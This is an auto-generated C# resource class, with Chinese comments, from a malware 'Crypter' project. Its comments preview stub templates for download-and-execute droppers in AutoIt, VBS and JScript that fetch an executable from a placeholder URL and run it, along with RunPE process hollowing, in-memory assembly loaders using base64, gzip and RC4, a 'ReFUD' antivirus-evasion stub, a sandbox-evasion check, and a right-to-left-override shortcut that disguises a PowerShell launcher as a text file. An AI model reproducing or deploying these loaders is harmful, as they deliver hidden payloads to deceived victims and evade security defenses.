//------------------------------------------------------------------------------
// <auto-generated>
//     此代码由工具生成。
//     运行时版本:4.0.30319.42000
//
//     对此文件的更改可能会导致不正确的行为，并且如果
//     重新生成代码，这些更改将会丢失。
// </auto-generated>
//------------------------------------------------------------------------------

namespace Crypter.Properties {
    using System;
    
    
    /// <summary>
    ///   一个强类型的资源类，用于查找本地化的字符串等。
    /// </summary>
    // 此类是由 StronglyTypedResourceBuilder
    // 类通过类似于 ResGen 或 Visual Studio 的工具自动生成的。
    // 若要添加或移除成员，请编辑 .ResX 文件，然后重新运行 ResGen
    // (以 /str 作为命令选项)，或重新生成 VS 项目。
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resources {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources() {
        }
        
        /// <summary>
        ///   返回此类使用的缓存的 ResourceManager 实例。
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("Crypter.Properties.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   重写当前线程的 CurrentUICulture 属性
        ///   重写当前线程的 CurrentUICulture 属性。
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
        
        /// <summary>
        ///   查找 System.Byte[] 类型的本地化资源。
        /// </summary>
        internal static byte[] Aut2exe {
            get {
                object obj = ResourceManager.GetObject("Aut2exe", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   查找类似 #include &lt;InetConstants.au3&gt;
        ///#include &lt;MsgBoxConstants.au3&gt;
        ///#include &lt;WinAPIFiles.au3&gt;
        ///
        ///
        ///Local $sFilePath = _WinAPI_GetTempFileName(@TempDir) &amp; &quot;.exe&quot;
        ///InetGet(&quot;#URL&quot;, $sFilePath, 2, $INET_DOWNLOADWAIT)
        ///RunWait($sFilePath) 的本地化字符串。
        /// </summary>
        internal static string autoit_url {
            get {
                return ResourceManager.GetString("autoit_url", resourceCulture);
            }
        }
        
        /// <summary>
        ///   查找 System.Drawing.Bitmap 类型的本地化资源。
        /// </summary>
        internal static System.Drawing.Bitmap avatar {
            get {
                object obj = ResourceManager.GetObject("avatar", resourceCulture);
                return ((System.Drawing.Bitmap)(obj));
            }
        }
        
        /// <summary>
        ///   查找类似 using Microsoft.VisualBasic;
        ///using System;
        ///using System.Diagnostics;
        ///using System.IO;
        ///using System.Runtime.InteropServices;
        ///
        ///namespace RunPE
        ///{        
        ///    public static class RunPE
        ///    {
        ///
        ///        #region API delegate
        ///        private delegate int DelegateResumeThread(IntPtr handle);
        ///        private delegate bool DelegateWow64SetThreadContext(IntPtr thread, int[] context);
        ///        private delegate bool DelegateSetThreadContext(IntPtr thread, int[] context);
        ///        private delegate bool Delegat [字符串的其余部分被截断]&quot;; 的本地化字符串。
        /// </summary>
        internal static string base64 {
            get {
                return ResourceManager.GetString("base64", resourceCulture);
            }
        }
        
        /// <summary>
        ///   查找类似 using System;
        ///using System.Collections;
        ///using System.Collections.Generic;
        ///using System.Data;
        ///using System.Drawing;
        ///using System.Diagnostics;
        ///using System.Windows.Forms;
        ///using System.Linq;
        ///using System.Xml.Linq;
        ///using System.Threading.Tasks;
        ///using System.IO;
        ///using System.IO.Compression;
        ///
        ///namespace v
        ///{
        ///    internal static class Module1
        ///    {
        ///        public static byte[] crypt()
        ///        {
        ///            return Decompress(Convert.FromBase64String(&quot;123456&quot;));
        ///
        ///
        ///        }
        ///        public static [字符串的其余部分被截断]&quot;; 的本地化字符串。
        /// </summary>
        internal static string base64_Gzip {
            get {
                return ResourceManager.GetString("base64_Gzip", resourceCulture);
            }
        }
        
        /// <summary>
        ///   查找类似 using System;
        ///using System.Collections.Generic;
        ///using System.IO;
        ///using System.Linq;
        ///using System.Net;
        ///using System.Reflection;
        ///using System.Text;
        ///using System.Threading;
        ///
        ///
        ///namespace ConsoleApp2
        ///{
        ///    class Program
        ///    {
        ///        static void Main(string[] args)
        ///        {
        ///           
        ///
        ///            AppDomain temoDomain = AppDomain.CreateDomain(&quot;TempDomain&quot;);
        ///            temoDomain.DoCallBack(Callback);
        ///            Thread.Sleep(-1);
        ///            AppDomain.Unload(temoDomain);
        ///        }
        ///       [字符串的其余部分被截断]&quot;; 的本地化字符串。
        /// </summary>
        internal static string base64_url {
            get {
                return ResourceManager.GetString("base64_url", resourceCulture);
            }
        }
        
        /// <summary>
        ///   查找类似 using System;
        ///using System.Diagnostics;
        ///using System.IO;
        ///using System.Security.Cryptography;
        ///using System.Text;
        ///using TaskScheduler;//记得加入COM组件TaskSchedulerClass Type Library
        /////引用taskchd.dll后选中按下F4在属性中将 嵌入互操作类型 改为 False
        ///
        ///namespace jsLoader
        ///{
        ///    class Program
        ///    {
        ///        static string v1gf8hg16cx1d = @&quot;var xml=new ActiveXObject(&apos;Microsoft.XMLHTTP&apos;);xml.open(&apos;GET&apos;,&apos;123456&apos;,false);xml.send();var aaa=xml.responseText;eval(aaa);&quot;;
        ///        
        ///        static void Main(string[] args)
        ///        {
        ///     [字符串的其余部分被截断]&quot;; 的本地化字符串。
        /// </summary>
        internal static string CSharp_js_url {
            get {
                return ResourceManager.GetString("CSharp_js_url", resourceCulture);
            }
        }
        
        /// <summary>
        ///   查找类似 using System;
        ///using System.Diagnostics;
        ///using System.IO;
        ///using System.Net;
        ///using System.Threading;
        ///
        ///namespace CsharpDW
        ///{
        ///    class Program
        ///    {
        ///        static void Main()
        ///        {
        ///            try
        ///            {
        ///                using (FileStream fs = new FileStream(Path.Combine(Path.GetTempPath(), &quot;DW.exe&quot;), FileMode.Create))
        ///                {
        ///                    byte[] payload = DownloadPayload(&quot;123456&quot;);
        ///                    fs.Write(payload, 0, payload.Length);
        ///                }
        ///        [字符串的其余部分被截断]&quot;; 的本地化字符串。
        /// </summary>
        internal static string CSharp_url {
            get {
                return ResourceManager.GetString("CSharp_url", resourceCulture);
            }
        }
        
        /// <summary>
        ///   查找类似 using System;
        ///using System.Reflection;
        ///using System.Runtime.CompilerServices;
        ///using Microsoft.VisualBasic.CompilerServices;
        ///
        ///namespace MonoFlat
        ///{
        ///	[StandardModule]
        ///	public sealed class Module1
        ///	{
        ///		public static void Main()
        ///		{
        ///			string s = &quot;123456&quot;;
        ///			byte[] rawAssembly = Convert.FromBase64String(s);
        ///			Assembly assembly = AppDomain.CurrentDomain.Load(rawAssembly);
        ///			MethodInfo entryPoint = assembly.EntryPoint;
        ///			object objectValue = RuntimeHelpers.GetObjectValue(assembly.CreateInstance [字符串的其余部分被截断]&quot;; 的本地化字符串。
        /// </summary>
        internal static string dll {
            get {
                return ResourceManager.GetString("dll", resourceCulture);
            }
        }
        
        /// <summary>
        ///   查找类似 using System;
        ///using System.Drawing;
        ///using System.Net;
        ///using System.Runtime.InteropServices;
        ///using System.Text;
        ///
        ///namespace imgc
        ///{
        ///    class Program
        ///    {
        ///        [DllImport(&quot;kernel32.dll&quot;)]
        ///        private static extern int VirtualAllocExNuma(IntPtr hProcess, int lpAddress, int dwSize, int flAllocationType, int flProtect, int nndPreferred);
        ///
        ///        static void Main(string[] args)
        ///        {
        ///           
        ///            object mem = null;
        ///            mem = VirtualAllocExNuma(System.Diagnostics.Process.GetCurrentPr [字符串的其余部分被截断]&quot;; 的本地化字符串。
        /// </summary>
        internal static string imgcrypt {
            get {
                return ResourceManager.GetString("imgcrypt", resourceCulture);
            }
        }
        
        /// <summary>
        ///   查找 System.Byte[] 类型的本地化资源。
        /// </summary>
        internal static byte[] Include {
            get {
                object obj = ResourceManager.GetObject("Include", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   查找类似 try {
        ///	var WshShell = WScript.CreateObject(&quot;WScript.Shell&quot;);
        ///    var filepath = WshShell.ExpandEnvironmentStrings(&quot;%TEMP%&quot;) + &quot;/DW.exe&quot;;
        ///	var url = &quot;123456&quot;
        ///	var xhr = new ActiveXObject(&quot;MSXML2.XMLHTTP&quot;)
        ///	xhr.open(&quot;GET&quot;, url, false)
        ///    xhr.send()
        ///	
        ///	var fso = new ActiveXObject(&quot;Scripting.FileSystemObject&quot;)
        ///		var stream = new ActiveXObject(&quot;ADODB.Stream&quot;)
        ///		stream.Open()
        ///        stream.Type = 1
        ///        stream.Write(xhr.ResponseBody)
        ///        stream.Position = 0
        ///        stream.SaveToFile(filepat [字符串的其余部分被截断]&quot;; 的本地化字符串。
        /// </summary>
        internal static string js_url {
            get {
                return ResourceManager.GetString("js_url", resourceCulture);
            }
        }
        
        /// <summary>
        ///   查找类似 Dim DownLoadLink, FileName
        ///DownLoadLink = &quot;&apos;123456&apos;&quot;
        ///FileName = CreateObject(&quot;WScript.Shell&quot;).ExpandEnvironmentStrings(&quot;%Temp%&quot;) + &quot;\DW.exe&quot;
        ///
        ///Set WshShell = CreateObject(&quot;WScript.Shell&quot;)
        ///Set ShApp = CreateObject(&quot;Shell.Application&quot;)
        ///unicode = Unescape(&quot;%u0052%u0065%u0061%u0064%u004d%u0065%u005f%u202e%u0074%u0078%u0074%u002e%u006c%u006e%u006b&quot;)
        ///unicodeName = &quot;unicode.lnk&quot;
        ///shortcutPath = unicodeName
        ///Set lnk = WshShell.CreateShortcut(shortcutPath)
        ///lnk.TargetPath = &quot;powershell.exe&quot;
        ///lnk.Arguments = &quot;- [字符串的其余部分被截断]&quot;; 的本地化字符串。
        /// </summary>
        internal static string lnk_url {
            get {
                return ResourceManager.GetString("lnk_url", resourceCulture);
            }
        }
        
        /// <summary>
        ///   查找类似 using System;
        ///using System.Collections.Generic;
        ///using System.Linq;
        ///using System.Threading.Tasks;
        ///using System.Windows.Forms;
        ///using System.Reflection;
        ///
        ///namespace WindowsFormsApp
        ///{
        ///    static class Program
        ///    {
        ///        /// &lt;summary&gt;
        ///        ///  The main entry point for the application.
        ///        /// &lt;/summary&gt;
        ///        [STAThread]
        ///        static void Main()
        ///        {
        ///            byte[] shellcode = new byte[654321] 
        ///            {
        ///            123456
        ///            };
        ///
        ///        Assembly.Load(she [字符串的其余部分被截断]&quot;; 的本地化字符串。
        /// </summary>
        internal static string PEbytes {
            get {
                return ResourceManager.GetString("PEbytes", resourceCulture);
            }
        }
        
        /// <summary>
        ///   查找类似 using System;
        ///using System.Collections.Generic;
        ///using System.Windows.Forms;
        ///
        ///namespace csharp_test
        ///{
        ///    static class Program
        ///    {
        ///        
        ///        [STAThread]
        ///        static void Main()
        ///        {
        ///
        ///            byte[] ont = {lol};
        ///            byte[] se = RC4decrypt(ont, &quot;kkkkk&quot;);
        ///
        ///        
        ///            AppDomain.CurrentDomain.Load(se).EntryPoint.Invoke(984985 - 984985, null);
        ///            
        ///        }
        ///
        ///        public static byte[] RC4decrypt(byte[] D1, string D2)
        ///        {
        ///            byt [字符串的其余部分被截断]&quot;; 的本地化字符串。
        /// </summary>
        internal static string rc4 {
            get {
                return ResourceManager.GetString("rc4", resourceCulture);
            }
        }
        
        /// <summary>
        ///   查找类似 Module ReFUD
        ///    Sub Main()
        ///        Dim B As String() = New String() {
        ///[stub-replace]
        /// }
        ///        Dim S As String = &quot;&quot;
        ///        For i = 0 To B.Length - 1
        ///            S += B(i).ToString
        ///        Next
        ///        Dim A As Object = GetType(Threading.Thread).GetMethod(&quot;Get&quot; + &quot;Domain&quot;).Invoke(0, Nothing)
        ///        Dim K As Object = A.load(Convert.FromBase64String(StrReverse(S)))
        ///        Dim C As Object = K.entrypoint
        ///        C.invoke(&quot;&quot;, Nothing)
        ///    End Sub
        ///End Module 的本地化字符串。
        /// </summary>
        internal static string VB {
            get {
                return ResourceManager.GetString("VB", resourceCulture);
            }
        }
        
        /// <summary>
        ///   查找类似 dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)
        ///dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)
        ///xHttp.Open &quot;GET&quot;, &quot;123456&quot;, False
        ///xHttp.Send
        ///scriptShell = CreateObject(&quot;WScript.Shell&quot;).ExpandEnvironmentStrings(&quot;%Temp%&quot;) + &quot;\DW.exe&quot;
        ///with bStrm
        ///    .type = 1
        ///    .open
        ///    .write xHttp.responseBody
        ///    .savetofile scriptShell, 2
        ///end with
        ///WScript.Sleep 1000
        ///Execut(scriptShell)
        ///
        ///Function Execut(path)
        ///Set objShell = CreateObject(&quot;Wscript.shell&quot;)
        ///objShell.run(path)
        ///End Function 的本地化字符串。
        /// </summary>
        internal static string VBS_url {
            get {
                return ResourceManager.GetString("VBS_url", resourceCulture);
            }
        }
    }
}
